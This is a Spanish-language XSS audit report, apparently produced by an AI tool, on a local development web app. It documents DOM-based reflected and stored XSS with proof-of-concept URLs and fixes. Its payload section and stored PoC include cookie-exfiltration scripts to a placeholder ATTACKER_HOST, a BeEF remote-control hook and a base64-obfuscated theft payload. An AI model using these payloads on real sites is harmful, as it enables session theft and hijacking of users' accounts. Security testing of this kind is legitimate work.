# Informe de Auditoría XSS — web.dev.local:8082

Fecha: 2026-04-16T13:09:52
Auditor: gpt5-mini (Copilot CLI)

Resumen ejecutivo
-----------------
Se ha identificado vulnerabilidad(es) de Cross-Site Scripting (XSS) en la aplicación objetivo http://web.dev.local:8082. Tipo(s) detectado(s): DOM-based Reflected XSS y DOM-based Stored XSS (persistente en localStorage). Estas vulnerabilidades permiten la ejecución de JavaScript arbitrario en el contexto del navegador de la víctima.

Pruebas realizadas
------------------
Comandos y exploración inicial:
- curl -sS -D /tmp/headers.txt http://web.dev.local:8082 -o /tmp/homepage.html
- grep -nEi '<form|<input|<textarea|<script|onerror|onload|onclick|value=' /tmp/homepage.html

Hallazgos técnicos
------------------
1) Punto: parámetro GET "search"
- Contexto: tomado desde URLSearchParams y escrito en la página con document.write() dentro de HTML:
  document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
- Tipo: DOM-based Reflected XSS (el input del usuario se inserta como HTML sin sanitizar)
- Prueba de concepto (reflected):
  URL:
  http://web.dev.local:8082/?search=<script>alert(1)</script>
  En un navegador, esto ejecutará alert(1) porque el valor se inserta en el DOM sin escape.

2) Punto: formulario de comentarios (name, comment)
- Contexto: los parámetros name y comment son leídos desde URLSearchParams, almacenados en localStorage y luego renderizados con document.write() cuando se muestran los comentarios:
  document.write('<div class="comment-author">' + c.name + '</div>');
  document.write('<div>' + c.comment + '</div>');
- Tipo: DOM-based Stored XSS (persistente en localStorage para ese navegador)
- Prueba de concepto (stored):
  1. Visitar: http://web.dev.local:8082/?name=attacker&comment=<script>alert(1)</script>
  2. La página guardará el comentario en localStorage y redireccionará a la ruta limpia; al recargar, el contenido almacenado se renderiza y ejecuta JavaScript.

Payloads de explotación (ejemplos)
----------------------------------
- Simple alert (confirmación):
  <script>alert(1)</script>

- Robo de sesión (exfiltración a servidor atacante):
  <script>new Image().src='http://ATTACKER_HOST:9000/?c='+encodeURIComponent(document.cookie)</script>

- BeEF hook (persistence/remote control):
  <script src="http://ATTACKER_HOST:3000/hook.js"></script>

- Evasión básica (base64):
  <script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vQVRUQUNLRVJfSE9TVDoxMDAwLz9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk='))</script>

Herramientas y comandos sugeridos
--------------------------------
- Dalfox (fuzz & discover):
  dalfox scan --url "http://web.dev.local:8082/?search=FUZZ" --custom-headers "User-Agent:dalfox" --wordlist /path/to/XSS-Bypass-Strings-Brute.txt

- XSStrike (crawl + fuzz):
  xsstrike -u "http://web.dev.local:8082/" --crawl 1 --data "" --methods GET

- ffuf (fuzz parameters):
  ffuf -u http://web.dev.local:8082/?search=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

Limitaciones de esta auditoría
------------------------------
- Herramientas automatizadas (dalfox/xsstrike) no estaban instaladas en el entorno de ejecución automático; se han proporcionado comandos y PoC válidos para ejecutar desde una máquina con dichas herramientas.
- No se ha ejecutado un navegador headless en este entorno para demostrar la exfiltración real (ej. captura de document.cookie) debido a limitaciones de la sesión actual. Sin embargo, las vulnerabilidades fueron confirmadas por inspección del código fuente y por PoC de inyección que, al abrirse en un navegador real, desencadenan ejecución JS.

Recomendaciones
---------------
1. Escapar/encodear todo contenido derivado de entrada de usuario antes de insertarlo en el DOM. Usar textContent o crear nodos en lugar de innerHTML/document.write.
   Ejemplo seguro:
   const node = document.createElement('strong'); node.textContent = searchTerm; parent.appendChild(node);

2. Evitar usar document.write y no almacenar contenido HTML sin saneamiento en localStorage.
3. Implementar CSP (Content Security Policy) que bloquee la ejecución de scripts externos no autorizados y reduzca el riesgo de inyección.
4. Validar y sanitizar entradas en el cliente y servidor.

Evidencia y pasos de reproducción (resumen)
-------------------------------------------
- Reflected PoC: abrir en navegador
  http://web.dev.local:8082/?search=<script>alert(1)</script>

- Stored PoC: abrir en navegador
  1) Visitar: http://web.dev.local:8082/?name=attacker&comment=<script>new Image().src='http://ATTACKER_HOST:9000/?c='+document.cookie</script>
  2) La página almacenará el comentario; al recargar, la petición GET al servidor atacante contendrá las cookies del sitio (si no están marcadas HttpOnly).

Conclusión
----------
La aplicación presenta vulnerabilidades XSS tanto reflejadas como persistentes (dom-based). Se recomienda corregir con prioridad alta por riesgo de robo de sesiones, hijacking y ejecución remota de acciones en nombre del usuario.

---
Archivo generado automáticamente por el auditor. Reemplazar ATTACKER_HOST en las pruebas por la IP/host del laboratorio atacante.
